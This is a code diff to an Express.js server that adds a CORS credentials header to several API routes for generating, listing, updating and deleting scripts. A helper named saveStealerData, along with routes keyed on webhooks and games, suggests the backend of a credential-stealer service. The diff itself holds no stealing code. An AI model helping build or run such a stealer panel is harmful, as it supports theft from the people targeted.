@@ -874,6 +874,7 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
       console.error('Error saving script:', error);
     }
 
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.json({
       success: true,
       message: 'Script generated successfully',
@@ -888,6 +889,7 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
     console.log('✅ [SCRIPT GENERATE] Complete!\n');
   } catch (error) {
     console.error('❌ Generate script error:', error);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
@@ -969,6 +971,7 @@ app.get('/api/stats', async (req, res) => {
       new Date(s.createdAt).toDateString() === today
     ).length;
 
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.json({
       success: true,
       stats: {
@@ -980,6 +983,7 @@ app.get('/api/stats', async (req, res) => {
     });
   } catch (error) {
     console.error('Stats error:', error);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
@@ -996,12 +1000,14 @@ app.get('/api/scripts/list', async (req, res) => {
     
     const userScripts = allScripts.filter(s => s.userId === userId).reverse();
 
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.json({
       success: true,
       scripts: userScripts
     });
   } catch (error) {
     console.error('List scripts error:', error);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
@@ -1053,6 +1059,7 @@ app.put('/api/scripts/update/:id/:webhookUrl', async (req, res) => {
 
     await saveStealerData({ users: data.users || [], scripts, leaderboard: data.leaderboard || [] });
 
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.json({
       success: true,
       message: 'Script updated successfully',
@@ -1065,6 +1072,7 @@ app.put('/api/scripts/update/:id/:webhookUrl', async (req, res) => {
     });
   } catch (error) {
     console.error('Update script error:', error);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
@@ -1090,9 +1098,11 @@ app.delete('/api/scripts/delete/:id', async (req, res) => {
     scripts.splice(scriptIndex, 1);
     await saveStealerData({ users: data.users || [], scripts, leaderboard: data.leaderboard || [] });
 
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.json({ success: true, message: 'Script deleted successfully' });
   } catch (error) {
     console.error('Delete script error:', error);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
